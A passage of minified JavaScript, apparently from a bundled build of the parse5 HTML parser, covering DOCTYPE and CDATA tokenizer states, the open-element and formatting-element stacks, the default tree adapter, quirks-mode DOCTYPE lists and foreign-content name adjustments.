z.APOSTROPHE:{n.systemId="",this.state=V.DOCTYPE_SYSTEM_IDENTIFIER_SINGLE_QUOTED;break}case z.EOF:{this._err(he.eofInDoctype),n.forceQuirks=!0,this.emitCurrentDoctype(n),this._emitEOFToken();break}default:this._err(he.missingQuoteBeforeDoctypeSystemIdentifier),n.forceQuirks=!0,this.state=V.BOGUS_DOCTYPE,this._stateBogusDoctype(t)}}_stateAfterDoctypeSystemKeyword(t){const n=this.currentToken;switch(t){case z.SPACE:case z.LINE_FEED:case z.TABULATION:case z.FORM_FEED:{this.state=V.BEFORE_DOCTYPE_SYSTEM_IDENTIFIER;break}case z.QUOTATION_MARK:{this._err(he.missingWhitespaceAfterDoctypeSystemKeyword),n.systemId="",this.state=V.DOCTYPE_SYSTEM_IDENTIFIER_DOUBLE_QUOTED;break}case z.APOSTROPHE:{this._err(he.missingWhitespaceAfterDoctypeSystemKeyword),n.systemId="",this.state=V.DOCTYPE_SYSTEM_IDENTIFIER_SINGLE_QUOTED;break}case z.GREATER_THAN_SIGN:{this._err(he.missingDoctypeSystemIdentifier),n.forceQuirks=!0,this.state=V.DATA,this.emitCurrentDoctype(n);break}case z.EOF:{this._err(he.eofInDoctype),n.forceQuirks=!0,this.emitCurrentDoctype(n),this._emitEOFToken();break}default:this._err(he.missingQuoteBeforeDoctypeSystemIdentifier),n.forceQuirks=!0,this.state=V.BOGUS_DOCTYPE,this._stateBogusDoctype(t)}}_stateBeforeDoctypeSystemIdentifier(t){const n=this.currentToken;switch(t){case z.SPACE:case z.LINE_FEED:case z.TABULATION:case z.FORM_FEED:break;case z.QUOTATION_MARK:{n.systemId="",this.state=V.DOCTYPE_SYSTEM_IDENTIFIER_DOUBLE_QUOTED;break}case z.APOSTROPHE:{n.systemId="",this.state=V.DOCTYPE_SYSTEM_IDENTIFIER_SINGLE_QUOTED;break}case z.GREATER_THAN_SIGN:{this._err(he.missingDoctypeSystemIdentifier),n.forceQuirks=!0,this.state=V.DATA,this.emitCurrentDoctype(n);break}case z.EOF:{this._err(he.eofInDoctype),n.forceQuirks=!0,this.emitCurrentDoctype(n),this._emitEOFToken();break}default:this._err(he.missingQuoteBeforeDoctypeSystemIdentifier),n.forceQuirks=!0,this.state=V.BOGUS_DOCTYPE,this._stateBogusDoctype(t)}}_stateDoctypeSystemIdentifierDoubleQuoted(t){const n=this.currentToken;switch(t){case z.QUOTATION_MARK:{this.state=V.AFTER_DOCTYPE_SYSTEM_IDENTIFIER;break}case z.NULL:{this._err(he.unexpectedNullCharacter),n.systemId+=Ut;break}case z.GREATER_THAN_SIGN:{this._err(he.abruptDoctypeSystemIdentifier),n.forceQuirks=!0,this.emitCurrentDoctype(n),this.state=V.DATA;break}case z.EOF:{this._err(he.eofInDoctype),n.forceQuirks=!0,this.emitCurrentDoctype(n),this._emitEOFToken();break}default:n.systemId+=String.fromCodePoint(t)}}_stateDoctypeSystemIdentifierSingleQuoted(t){const n=this.currentToken;switch(t){case z.APOSTROPHE:{this.state=V.AFTER_DOCTYPE_SYSTEM_IDENTIFIER;break}case z.NULL:{this._err(he.unexpectedNullCharacter),n.systemId+=Ut;break}case z.GREATER_THAN_SIGN:{this._err(he.abruptDoctypeSystemIdentifier),n.forceQuirks=!0,this.emitCurrentDoctype(n),this.state=V.DATA;break}case z.EOF:{this._err(he.eofInDoctype),n.forceQuirks=!0,this.emitCurrentDoctype(n),this._emitEOFToken();break}default:n.systemId+=String.fromCodePoint(t)}}_stateAfterDoctypeSystemIdentifier(t){const n=this.currentToken;switch(t){case z.SPACE:case z.LINE_FEED:case z.TABULATION:case z.FORM_FEED:break;case z.GREATER_THAN_SIGN:{this.emitCurrentDoctype(n),this.state=V.DATA;break}case z.EOF:{this._err(he.eofInDoctype),n.forceQuirks=!0,this.emitCurrentDoctype(n),this._emitEOFToken();break}default:this._err(he.unexpectedCharacterAfterDoctypeSystemIdentifier),this.state=V.BOGUS_DOCTYPE,this._stateBogusDoctype(t)}}_stateBogusDoctype(t){const n=this.currentToken;switch(t){case z.GREATER_THAN_SIGN:{this.emitCurrentDoctype(n),this.state=V.DATA;break}case z.NULL:{this._err(he.unexpectedNullCharacter);break}case z.EOF:{this.emitCurrentDoctype(n),this._emitEOFToken();break}}}_stateCdataSection(t){switch(t){case z.RIGHT_SQUARE_BRACKET:{this.state=V.CDATA_SECTION_BRACKET;break}case z.EOF:{this._err(he.eofInCdata),this._emitEOFToken();break}default:this._emitCodePoint(t)}}_stateCdataSectionBracket(t){t===z.RIGHT_SQUARE_BRACKET?this.state=V.CDATA_SECTION_END:(this._emitChars("]"),this.state=V.CDATA_SECTION,this._stateCdataSection(t))}_stateCdataSectionEnd(t){switch(t){case z.GREATER_THAN_SIGN:{this.state=V.DATA;break}case z.RIGHT_SQUARE_BRACKET:{this._emitChars("]");break}default:this._emitChars("]]"),this.state=V.CDATA_SECTION,this._stateCdataSection(t)}}_stateCharacterReference(){let t=this.entityDecoder.write(this.preprocessor.html,this.preprocessor.pos);if(t<0)if(this.preprocessor.lastChunkWritten)t=this.entityDecoder.end();else{this.active=!1,this.preprocessor.pos=this.preprocessor.html.length-1,this.consumedAfterSnapshot=0,this.preprocessor.endOfChunkHit=!0;return}t===0?(this.preprocessor.pos=this.entityStartPos,this._flushCodePointConsumedAsCharacterReference(z.AMPERSAND),this.state=!this._isCharacterReferenceInAttribute()&&d2(this.preprocessor.peek(1))?V.AMBIGUOUS_AMPERSAND:this.returnState):this.state=this.returnState}_stateAmbiguousAmpersand(t){d2(t)?this._flushCodePointConsumedAsCharacterReference(t):(t===z.SEMICOLON&&this._err(he.unknownNamedCharacterReference),this.state=this.returnState,this._callState(t))}}const uC=new Set([v.DD,v.DT,v.LI,v.OPTGROUP,v.OPTION,v.P,v.RB,v.RP,v.RT,v.RTC]),h2=new Set([...uC,v.CAPTION,v.COLGROUP,v.TBODY,v.TD,v.TFOOT,v.TH,v.THEAD,v.TR]),xf=new Set([v.APPLET,v.CAPTION,v.HTML,v.MARQUEE,v.OBJECT,v.TABLE,v.TD,v.TEMPLATE,v.TH]),sM=new Set([...xf,v.OL,v.UL]),lM=new Set([...xf,v.BUTTON]),p2=new Set([v.ANNOTATION_XML,v.MI,v.MN,v.MO,v.MS,v.MTEXT]),m2=new Set([v.DESC,v.FOREIGN_OBJECT,v.TITLE]),oM=new Set([v.TR,v.TEMPLATE,v.HTML]),uM=new Set([v.TBODY,v.TFOOT,v.THEAD,v.TEMPLATE,v.HTML]),cM=new Set([v.TABLE,v.TEMPLATE,v.HTML]),dM=new Set([v.TD,v.TH]);class fM{get currentTmplContentOrNode(){return this._isInTemplate()?this.treeAdapter.getTemplateContent(this.current):this.current}constructor(t,n,r){this.treeAdapter=n,this.handler=r,this.items=[],this.tagIDs=[],this.stackTop=-1,this.tmplCount=0,this.currentTagId=v.UNKNOWN,this.current=t}_indexOf(t){return this.items.lastIndexOf(t,this.stackTop)}_isInTemplate(){return this.currentTagId===v.TEMPLATE&&this.treeAdapter.getNamespaceURI(this.current)===be.HTML}_updateCurrentElement(){this.current=this.items[this.stackTop],this.currentTagId=this.tagIDs[this.stackTop]}push(t,n){this.stackTop++,this.items[this.stackTop]=t,this.current=t,this.tagIDs[this.stackTop]=n,this.currentTagId=n,this._isInTemplate()&&this.tmplCount++,this.handler.onItemPush(t,n,!0)}pop(){const t=this.current;this.tmplCount>0&&this._isInTemplate()&&this.tmplCount--,this.stackTop--,this._updateCurrentElement(),this.handler.onItemPop(t,!0)}replace(t,n){const r=this._indexOf(t);this.items[r]=n,r===this.stackTop&&(this.current=n)}insertAfter(t,n,r){const a=this._indexOf(t)+1;this.items.splice(a,0,n),this.tagIDs.splice(a,0,r),this.stackTop++,a===this.stackTop&&this._updateCurrentElement(),this.current&&this.currentTagId!==void 0&&this.handler.onItemPush(this.current,this.currentTagId,a===this.stackTop)}popUntilTagNamePopped(t){let n=this.stackTop+1;do n=this.tagIDs.lastIndexOf(t,n-1);while(n>0&&this.treeAdapter.getNamespaceURI(this.items[n])!==be.HTML);this.shortenToLength(Math.max(n,0))}shortenToLength(t){for(;this.stackTop>=t;){const n=this.current;this.tmplCount>0&&this._isInTemplate()&&(this.tmplCount-=1),this.stackTop--,this._updateCurrentElement(),this.handler.onItemPop(n,this.stackTop<t)}}popUntilElementPopped(t){const n=this._indexOf(t);this.shortenToLength(Math.max(n,0))}popUntilPopped(t,n){const r=this._indexOfTagNames(t,n);this.shortenToLength(Math.max(r,0))}popUntilNumberedHeaderPopped(){this.popUntilPopped(B0,be.HTML)}popUntilTableCellPopped(){this.popUntilPopped(dM,be.HTML)}popAllUpToHtmlElement(){this.tmplCount=0,this.shortenToLength(1)}_indexOfTagNames(t,n){for(let r=this.stackTop;r>=0;r--)if(t.has(this.tagIDs[r])&&this.treeAdapter.getNamespaceURI(this.items[r])===n)return r;return-1}clearBackTo(t,n){const r=this._indexOfTagNames(t,n);this.shortenToLength(r+1)}clearBackToTableContext(){this.clearBackTo(cM,be.HTML)}clearBackToTableBodyContext(){this.clearBackTo(uM,be.HTML)}clearBackToTableRowContext(){this.clearBackTo(oM,be.HTML)}remove(t){const n=this._indexOf(t);n>=0&&(n===this.stackTop?this.pop():(this.items.splice(n,1),this.tagIDs.splice(n,1),this.stackTop--,this._updateCurrentElement(),this.handler.onItemPop(t,!1)))}tryPeekProperlyNestedBodyElement(){return this.stackTop>=1&&this.tagIDs[1]===v.BODY?this.items[1]:null}contains(t){return this._indexOf(t)>-1}getCommonAncestor(t){const n=this._indexOf(t)-1;return n>=0?this.items[n]:null}isRootHtmlElementCurrent(){return this.stackTop===0&&this.tagIDs[0]===v.HTML}hasInDynamicScope(t,n){for(let r=this.stackTop;r>=0;r--){const a=this.tagIDs[r];switch(this.treeAdapter.getNamespaceURI(this.items[r])){case be.HTML:{if(a===t)return!0;if(n.has(a))return!1;break}case be.SVG:{if(m2.has(a))return!1;break}case be.MATHML:{if(p2.has(a))return!1;break}}}return!0}hasInScope(t){return this.hasInDynamicScope(t,xf)}hasInListItemScope(t){return this.hasInDynamicScope(t,sM)}hasInButtonScope(t){return this.hasInDynamicScope(t,lM)}hasNumberedHeaderInScope(){for(let t=this.stackTop;t>=0;t--){const n=this.tagIDs[t];switch(this.treeAdapter.getNamespaceURI(this.items[t])){case be.HTML:{if(B0.has(n))return!0;if(xf.has(n))return!1;break}case be.SVG:{if(m2.has(n))return!1;break}case be.MATHML:{if(p2.has(n))return!1;break}}}return!0}hasInTableScope(t){for(let n=this.stackTop;n>=0;n--)if(this.treeAdapter.getNamespaceURI(this.items[n])===be.HTML)switch(this.tagIDs[n]){case t:return!0;case v.TABLE:case v.HTML:return!1}return!0}hasTableBodyContextInTableScope(){for(let t=this.stackTop;t>=0;t--)if(this.treeAdapter.getNamespaceURI(this.items[t])===be.HTML)switch(this.tagIDs[t]){case v.TBODY:case v.THEAD:case v.TFOOT:return!0;case v.TABLE:case v.HTML:return!1}return!0}hasInSelectScope(t){for(let n=this.stackTop;n>=0;n--)if(this.treeAdapter.getNamespaceURI(this.items[n])===be.HTML)switch(this.tagIDs[n]){case t:return!0;case v.OPTION:case v.OPTGROUP:break;default:return!1}return!0}generateImpliedEndTags(){for(;this.currentTagId!==void 0&&uC.has(this.currentTagId);)this.pop()}generateImpliedEndTagsThoroughly(){for(;this.currentTagId!==void 0&&h2.has(this.currentTagId);)this.pop()}generateImpliedEndTagsWithExclusion(t){for(;this.currentTagId!==void 0&&this.currentTagId!==t&&h2.has(this.currentTagId);)this.pop()}}const ym=3;var oi;(function(e){e[e.Marker=0]="Marker",e[e.Element=1]="Element"})(oi||(oi={}));const g2={type:oi.Marker};class hM{constructor(t){this.treeAdapter=t,this.entries=[],this.bookmark=null}_getNoahArkConditionCandidates(t,n){const r=[],a=n.length,l=this.treeAdapter.getTagName(t),u=this.treeAdapter.getNamespaceURI(t);for(let f=0;f<this.entries.length;f++){const h=this.entries[f];if(h.type===oi.Marker)break;const{element:m}=h;if(this.treeAdapter.getTagName(m)===l&&this.treeAdapter.getNamespaceURI(m)===u){const x=this.treeAdapter.getAttrList(m);x.length===a&&r.push({idx:f,attrs:x})}}return r}_ensureNoahArkCondition(t){if(this.entries.length<ym)return;const n=this.treeAdapter.getAttrList(t),r=this._getNoahArkConditionCandidates(t,n);if(r.length<ym)return;const a=new Map(n.map(u=>[u.name,u.value]));let l=0;for(let u=0;u<r.length;u++){const f=r[u];f.attrs.every(h=>a.get(h.name)===h.value)&&(l+=1,l>=ym&&this.entries.splice(f.idx,1))}}insertMarker(){this.entries.unshift(g2)}pushElement(t,n){this._ensureNoahArkCondition(t),this.entries.unshift({type:oi.Element,element:t,token:n})}insertElementAfterBookmark(t,n){const r=this.entries.indexOf(this.bookmark);this.entries.splice(r,0,{type:oi.Element,element:t,token:n})}removeEntry(t){const n=this.entries.indexOf(t);n!==-1&&this.entries.splice(n,1)}clearToLastMarker(){const t=this.entries.indexOf(g2);t===-1?this.entries.length=0:this.entries.splice(0,t+1)}getElementEntryInScopeWithTagName(t){const n=this.entries.find(r=>r.type===oi.Marker||this.treeAdapter.getTagName(r.element)===t);return n&&n.type===oi.Element?n:null}getElementEntry(t){return this.entries.find(n=>n.type===oi.Element&&n.element===t)}}const oa={createDocument(){return{nodeName:"#document",mode:Dr.NO_QUIRKS,childNodes:[]}},createDocumentFragment(){return{nodeName:"#document-fragment",childNodes:[]}},createElement(e,t,n){return{nodeName:e,tagName:e,attrs:n,namespaceURI:t,childNodes:[],parentNode:null}},createCommentNode(e){return{nodeName:"#comment",data:e,parentNode:null}},createTextNode(e){return{nodeName:"#text",value:e,parentNode:null}},appendChild(e,t){e.childNodes.push(t),t.parentNode=e},insertBefore(e,t,n){const r=e.childNodes.indexOf(n);e.childNodes.splice(r,0,t),t.parentNode=e},setTemplateContent(e,t){e.content=t},getTemplateContent(e){return e.content},setDocumentType(e,t,n,r){const a=e.childNodes.find(l=>l.nodeName==="#documentType");if(a)a.name=t,a.publicId=n,a.systemId=r;else{const l={nodeName:"#documentType",name:t,publicId:n,systemId:r,parentNode:null};oa.appendChild(e,l)}},setDocumentMode(e,t){e.mode=t},getDocumentMode(e){return e.mode},detachNode(e){if(e.parentNode){const t=e.parentNode.childNodes.indexOf(e);e.parentNode.childNodes.splice(t,1),e.parentNode=null}},insertText(e,t){if(e.childNodes.length>0){const n=e.childNodes[e.childNodes.length-1];if(oa.isTextNode(n)){n.value+=t;return}}oa.appendChild(e,oa.createTextNode(t))},insertTextBefore(e,t,n){const r=e.childNodes[e.childNodes.indexOf(n)-1];r&&oa.isTextNode(r)?r.value+=t:oa.insertBefore(e,oa.createTextNode(t),n)},adoptAttributes(e,t){const n=new Set(e.attrs.map(r=>r.name));for(let r=0;r<t.length;r++)n.has(t[r].name)||e.attrs.push(t[r])},getFirstChild(e){return e.childNodes[0]},getChildNodes(e){return e.childNodes},getParentNode(e){return e.parentNode},getAttrList(e){return e.attrs},getTagName(e){return e.tagName},getNamespaceURI(e){return e.namespaceURI},getTextNodeContent(e){return e.value},getCommentNodeContent(e){return e.data},getDocumentTypeNodeName(e){return e.name},getDocumentTypeNodePublicId(e){return e.publicId},getDocumentTypeNodeSystemId(e){return e.systemId},isTextNode(e){return e.nodeName==="#text"},isCommentNode(e){return e.nodeName==="#comment"},isDocumentTypeNode(e){return e.nodeName==="#documentType"},isElementNode(e){return Object.prototype.hasOwnProperty.call(e,"tagName")},setNodeSourceCodeLocation(e,t){e.sourceCodeLocation=t},getNodeSourceCodeLocation(e){return e.sourceCodeLocation},updateNodeSourceCodeLocation(e,t){e.sourceCodeLocation={...e.sourceCodeLocation,...t}}},cC="html",pM="about:legacy-compat",mM="http://www.ibm.com/data/dtd/v11/ibmxhtml1-transitional.dtd",dC=["+//silmaril//dtd html pro v0r11 19970101//","-//as//dtd html 3.0 aswedit + extensions//","-//advasoft ltd//dtd html 3.0 aswedit + extensions//","-//ietf//dtd html 2.0 level 1//","-//ietf//dtd html 2.0 level 2//","-//ietf//dtd html 2.0 strict level 1//","-//ietf//dtd html 2.0 strict level 2//","-//ietf//dtd html 2.0 strict//","-//ietf//dtd html 2.0//","-//ietf//dtd html 2.1e//","-//ietf//dtd html 3.0//","-//ietf//dtd html 3.2 final//","-//ietf//dtd html 3.2//","-//ietf//dtd html 3//","-//ietf//dtd html level 0//","-//ietf//dtd html level 1//","-//ietf//dtd html level 2//","-//ietf//dtd html level 3//","-//ietf//dtd html strict level 0//","-//ietf//dtd html strict level 1//","-//ietf//dtd html strict level 2//","-//ietf//dtd html strict level 3//","-//ietf//dtd html strict//","-//ietf//dtd html//","-//metrius//dtd metrius presentational//","-//microsoft//dtd internet explorer 2.0 html strict//","-//microsoft//dtd internet explorer 2.0 html//","-//microsoft//dtd internet explorer 2.0 tables//","-//microsoft//dtd internet explorer 3.0 html strict//","-//microsoft//dtd internet explorer 3.0 html//","-//microsoft//dtd internet explorer 3.0 tables//","-//netscape comm. corp.//dtd html//","-//netscape comm. corp.//dtd strict html//","-//o'reilly and associates//dtd html 2.0//","-//o'reilly and associates//dtd html extended 1.0//","-//o'reilly and associates//dtd html extended relaxed 1.0//","-//sq//dtd html 2.0 hotmetal + extensions//","-//softquad software//dtd hotmetal pro 6.0::19990601::extensions to html 4.0//","-//softquad//dtd hotmetal pro 4.0::19971010::extensions to html 4.0//","-//spyglass//dtd html 2.0 extended//","-//sun microsystems corp.//dtd hotjava html//","-//sun microsystems corp.//dtd hotjava strict html//","-//w3c//dtd html 3 1995-03-24//","-//w3c//dtd html 3.2 draft//","-//w3c//dtd html 3.2 final//","-//w3c//dtd html 3.2//","-//w3c//dtd html 3.2s draft//","-//w3c//dtd html 4.0 frameset//","-//w3c//dtd html 4.0 transitional//","-//w3c//dtd html experimental 19960712//","-//w3c//dtd html experimental 970421//","-//w3c//dtd w3 html//","-//w3o//dtd w3 html 3.0//","-//webtechs//dtd mozilla html 2.0//","-//webtechs//dtd mozilla html//"],gM=[...dC,"-//w3c//dtd html 4.01 frameset//","-//w3c//dtd html 4.01 transitional//"],xM=new Set(["-//w3o//dtd w3 html strict 3.0//en//","-/w3c/dtd html 4.0 transitional/en","html"]),fC=["-//w3c//dtd xhtml 1.0 frameset//","-//w3c//dtd xhtml 1.0 transitional//"],yM=[...fC,"-//w3c//dtd html 4.01 frameset//","-//w3c//dtd html 4.01 transitional//"];function x2(e,t){return t.some(n=>e.startsWith(n))}function vM(e){return e.name===cC&&e.publicId===null&&(e.systemId===null||e.systemId===pM)}function bM(e){if(e.name!==cC)return Dr.QUIRKS;const{systemId:t}=e;if(t&&t.toLowerCase()===mM)return Dr.QUIRKS;let{publicId:n}=e;if(n!==null){if(n=n.toLowerCase(),xM.has(n))return Dr.QUIRKS;let r=t===null?gM:dC;if(x2(n,r))return Dr.QUIRKS;if(r=t===null?fC:yM,x2(n,r))return Dr.LIMITED_QUIRKS}return Dr.NO_QUIRKS}const y2={TEXT_HTML:"text/html",APPLICATION_XML:"application/xhtml+xml"},EM="definitionurl",wM="definitionURL",kM=new Map(["attributeName","attributeType","baseFrequency","baseProfile","calcMode","clipPathUnits","diffuseConstant","edgeMode","filterUnits","glyphRef","gradientTransform","gradientUnits","kernelMatrix","kernelUnitLength","keyPoints","keySplines","keyTimes","lengthAdjust","limitingConeAngle","markerHeight","markerUnits","markerWidth","maskContentUnits","maskUnits","numOctaves","pathLength","patternContentUnits","patternTransform","patternUnits","pointsAtX","pointsAtY","pointsAtZ","preserveAlpha","preserveAspectRatio","primitiveUnits","refX","refY","repeatCount","repeatDur","requiredExtensions","requiredFeatures","specularConstant","specularExponent","spreadMethod","startOffset","stdDeviation","stitchTiles","surfaceScale","systemLanguage","tableValues","targetX","targetY","textLength","viewBox","viewTarget","xChannelSelector","yChannelSelector","zoomAndPan"].map(e=>[e.toLowerCase(),e])),TM=new Map([["xlink:actuate",{prefix:"xlink",name:"actuate",namespace:be.XLINK}],["xlink:arcrole",{prefix:"xlink",name:"arcrole",namespace:be.XLINK}],["xlink:href",{prefix:"xlink",name:"href",namespace:be.XLINK}],["xlink:role",{prefix:"xlink",name:"role",namespace:be.XLINK}],["xlink:show",{prefix:"xlink",name:"show",namespace:be.XLINK}],["xlink:title",{prefix:"xlink",name:"title",namespace:be.XLINK}],["xlink:type",{prefix:"xlink",name:"type",namespace:be.XLINK}],["xml:lang",{prefix:"xml",name:"lang",namespace:be.XML}],["xml:space",{prefix:"xml",name:"space",namespace:be.XML}],["xmlns",{prefix:"",name:"xmlns",namespace:be.XMLNS}],["xmlns:xlink",{prefix:"xmlns",name:"xlink",namespace:be.XMLNS}]]),CM=new Map(["altGlyph","altGlyphDef","altGlyphItem","animateColor","animateMotion","animateTransform","clipPath","feBlend","feColorMatrix","feComponentTransfer","feComposite","feConvolveMatrix","feDiffuseLighting","feDisplacementMap","feDistantLight","feFlood","feFuncA","feFuncB","feFuncG","feFuncR","feGaussianBlur","feImage","feMerge","feMergeNode","feMorphology","feOffset","fePointLight","feSpecularLighting","feSpotLight","feTile","feTurbulence","foreignObject","glyphRef","linearGradient","radialGradient","textPath"].map(e=>[e.toLowerCase(),e])),SM=new Set([v.B,v.BIG,v.BLOCKQUOTE,v.BODY,v.BR,v.CENTER,v.CODE,v.DD,v.DIV,v.DL,v.DT,v.EM,v.EMBED,v.H1,v.H2,v.H3,v.H4,v.H5,v.H6,v.HEAD,v.HR,v.I,v.IMG,v.LI,v.LISTING,v.MENU,v.META,v.NOBR,v.OL,v.P,v.PRE,v.RUBY,v.S,v.SMALL,v.SPAN,v.STRONG,v.STRIKE,v.SUB,v.SUP,v.TABLE,v.TT,v.U,v.UL,v.VAR]);function NM(e){const t=e.tagID;return t===v.FONT&&e.attrs.some(({name:r})=>r===os.COLOR||r===os.SIZE||r===os.FACE)||SM.has(t)}function hC(e){for(let t=0;t<e.attrs.length;t++)if(e.attrs[t].name===EM){e.attrs[t].name=wM;break}}function pC(e){for(let t=0;t<e.attrs.length;t++){const n=kM.get(e.attrs[t].name);n!=null&&(e.attrs[t].name=n)}}function Cx(e){for(let t=0;t<e.attrs.length;t++){const n=TM.get(e.attrs[t].name);n&&(e.attrs[t].prefix=n.prefix,e.attrs[t].name=n.name,e.attrs[t].namespace=n.namespace)}}function AM(e){const t=CM.get(e.tagName);t!=null&&(e.tagName=t,e.tagID=Yl(e.tagName))}function DM(e,t){return t===be.MATHML&&(e===v.MI||e===v.MO||e===v.MN||e===v.MS||e===v.MTEXT)}function LM(e,t,n){if(t===be.MATHML&&e===v.ANNOTATION_XML){for(let r=0;r<n.length;r++)if(n[r].name===os.ENCODING){const a=n[r].value.toLowerCase();return a===y2.TEXT_HTML||a===y2.APPLICATION_XML}}return t===be.SVG&&(e===v.FOREIGN_OBJECT||e===v.DESC||e===v.TITLE)}function _M(e,t,n,r){return(!r||r===be.HTML)&&LM(e,t,n)||(!r||r===be.MATHML)&&DM(e,t)}const IM="hidden",PM=8,jM=3;var ee;(function(e){e[e.INITIAL=0]="INITIAL",e[e.BEFORE_HTML=1]="BEFORE_HTML",e[e.BEFORE_HEAD=2]="BEFORE_HEAD",e[e.IN_HEAD=3]="IN_HEAD",e[e.IN_HEAD_NO_SCRIPT=4]="IN_HEAD_NO_SCRIPT",e[e.AFTER_HEAD=5]="AFTER_HEAD",e[e.IN_BODY=6]="IN_BODY",e[e.TEXT=7]="TEXT",e[e.IN_TABLE=8]="IN_TABLE",e[e.IN_TABLE_TEXT=9]="IN_TABLE_TEXT",e[e.IN_CAPTION=10]="IN_CAPTION",e[e.IN_COLUMN_GROUP=11]="IN_COLUMN_GROUP",e[e.IN_TABLE_BODY=12]="IN_TABLE_BODY",e[e.IN_ROW=13]="IN_ROW",e[e.IN_CELL=14]="IN_CELL",e[e.IN_SELECT=15]="IN_SELECT",e[e.IN_SELECT_IN_TABLE=16]="IN_SELECT_IN_TABLE",e[e.IN_TEMPLATE=17]="IN_TEMPLATE",e[e.AFTER_BODY=18]="AFTER_BODY",e[e.IN_FRAMESET=19]="IN_FRAMESET",e[e.AFTER_FRAMESET=20]="AFTER_FRAMESET",e[e.AFTER_AFTER_BODY=21]="AFTER_AFTER_BODY",e[e.AFTER_AFTER_FRAMESET=22]="AFTER_AFTER_FRAMESET"})(ee||(ee={}));const RM={startLine:-1,startCol:-1,startOffset:-1,endLine:-1,endCol:-1,endOffset:-1},mC=new Set([v.TABLE,v.TBODY,v.TFOOT,v.THEAD,v.TR]),v2={scriptingEnabled:!0,sourceCodeLocationInfo:!1,treeAdapter:oa,onParseError:null};class b2{constructor(t,n,r=null,a=null){this.fragmentContext=r,this.scriptHandler=a,this.currentToken=null,this.stopped=!1,this.insertionMode=ee.INITIAL,this.originalInsertionMode=ee.INITIAL,this.headElement=null,this.formElement=null,this.currentNotInHTML=!1,this.tmplInsertionModeStack=[],this.pendingCharacterTokens=[],this.hasNonWhitespacePendingCharacterToken=!1,this.framesetOk=!0,this.skipNextNewLine=!1,this.fosterParentingEnabled=!1,this.options={...v2,...t},this.treeAdapter=this.options.treeAdapter,this.onParseError=this.options.onParseError,this.onParseError&&(this.options.sourceCodeLocationInfo=!0),this.document=n??this.treeAdapter.createDocument(),this.tokenizer=new aM(this.options,this),this.activeFormattingElements=new hM(this.treeAdapter),this.fragmentContextID=r?Yl(this.treeAdapter.getTagName(r)):v.UNKNOWN,this._setContextModes(r??this.document,this.fragmentContextID),this.openElements=new fM(this.document,this.treeAdapter,this)}static parse(t,n){const r=new this(n);return r.tokenizer.write(t,!0),r.document}static getFragmentParser(t,n){const r={...v2,...n};t??(t=r.treeAdapter.createElement(ce.TEMPLATE,be.HTML,[]));const a=r.treeAdapter.createElement("documentmock",be.HTML,[]),l=new this(r,a,t);return l.fragmentContextID===v.TEMPLATE&&l.tmplInsertionModeStack.unshift(ee.IN_TEMPLATE),l._initTokenizerForFragmentParsing(),l._insertFakeRootElement(),l._resetInsertionMode(),l._findFormInFragmentContext(),l}getFragment(){const t=this.treeAdapter.getFirstChild(this.document),n=this.treeAdapter.createDocumentFragment();return this._adoptNodes(t,n),n}_err(t,n,r){var a;if(!this.onParseError)return;const l=(a=t.location)!==null&&a!==void 0?a:RM,u={code:n,startLine:l.startLine,startCol:l.startCol,startOffset:l.startOffset,endLine:r?l.startLine:l.endLine,endCol:r?l.startCol:l.endCol,endOffset:r?l.startOffset:l.endOffset};this.onParseError(u)}onItemPush(t,n,r){var a,l;(l=(a=this.treeAdapter).onItemPush)===null||l===void 0||l.call(a,t),r&&this.openElements.stackTop>0&&this._setContextModes(t,n)}onItemPop(t,n){var r,a;if(this.options.sourceCodeLocationInfo&&this._setEndLocation(t,this.currentToken),(a=(r=this.treeAdapter).onItemPop)===null||a===void 0||a.call(r,t,this.openElements.current),n){let l,u;this.openElements.stackTop===0&&this.fragmentContext?(l=this.fragmentContext,u=this.fragmentContextID):{current:l,currentTagId:u}=this.openElements,this._setContextModes(l,u)}}_setContextModes(t,n){const r=t===this.document||t&&this.treeAdapter.getNamespaceURI(t)===be.HTML;this.currentNotInHTML=!r,this.tokenizer.inForeignNode=!r&&t!==void 0&&n!==void 0&&!this._isIntegrationPoint(n,t)}_switchToTextParsing(t,n){this._insertElement(t,be.HTML),this.tokenizer.state=n,this.originalInsertionMode=this.insertionMode,this.insertionMode=ee.TEXT}switchToPlaintextParsing(){this.insertionMode=ee.TEXT,this.originalInsertionMode=ee.IN_BODY,this.tokenizer.state=tn.PLAINTEXT}_getAdjustedCurrentElement(){return this.openElements.stackTop===0&&this.fragmentContext?this.fragmentContext:this.openElements.current}_findFormInFragmentContext(){let t=this.fragmentContext;for(;t;){if(this.treeAdapter.getTagName(t)===ce.FORM){this.formElement=t;break}t=this.treeAdapter.getParentNode(t)}}_initTokenizerForFragmentParsing(){if(!(!this.fragmentContext||this.treeAdapter.getNamespaceURI(this.fragmentContext)!==be.HTML))switch(this.fragmentContextID){case v.TITLE:case v.TEXTAREA:{this.tokenizer.state=tn.RCDATA;break}case v.STYLE:case v.XMP:case v.IFRAME:case v.NOEMBED:case v.NOFRAMES:case v.NOSCRIPT:{this.tokenizer.state=tn.RAWTEXT;break}case v.SCRIPT:{this.tokenizer.state=tn.SCRIPT_DATA;break}case v.PLAINTEXT:{this.tokenizer.state=tn.PLAINTEXT;break}}}_setDocumentType(t){const n=t.name||"",r=t.publicId||"",a=t.systemId||"";if(this.treeAdapter.setDocumentType(this.document,n,r,a),t.location){const u=this.treeAdapter.getChildNodes(this.document).find(f=>this.treeAdapter.isDocumentTypeNode(f));u&&this.treeAdapter.setNodeSourceCodeLocation(u,t.location)}}_attachElementToTree(t,n){if(this.options.sourceCodeLocationInfo){const r=n&&{...n,startTag:n};this.treeAdapter.setNodeSourceCodeLocation(t,r)}if(this._shouldFosterParentOnInsertion())this._fosterParentElement(t);else{const r=this.openElements.currentTmplContentOrNode;this.treeAdapter.appendChild(r??this.document,t)}}_appendElement(t,n){const r=this.treeAdapter.createElement(t.tagName,n,t.attrs);this._attachElementToTree(r,t.location)}_insertElement(t,n){const r=this.treeAdapter.createElement(t.tagName,n,t.attrs);this._attachElementToTree(r,t.location),this.openElements.push(r,t.tagID)}_insertFakeElement(t,n){const r=this.treeAdapter.createElement(t,be.HTML,[]);this._attachElementToTree(r,null),this.openElements.push(r,n)}_insertTemplate(t){const n=this.treeAdapter.createElement(t.tagName,be.HTML,t.attrs),r=this.treeAdapter.createDocumentFragment();this.treeAdapter.setTemplateContent(n,r),this._attachElementToTree(n,t.location),this.openElements.push(n,t.tagID),this.options.sourceCodeLocationInfo&&this.treeAdapter.setNodeSourceCodeLocation(r,null)}_insertFakeRootElement(){const 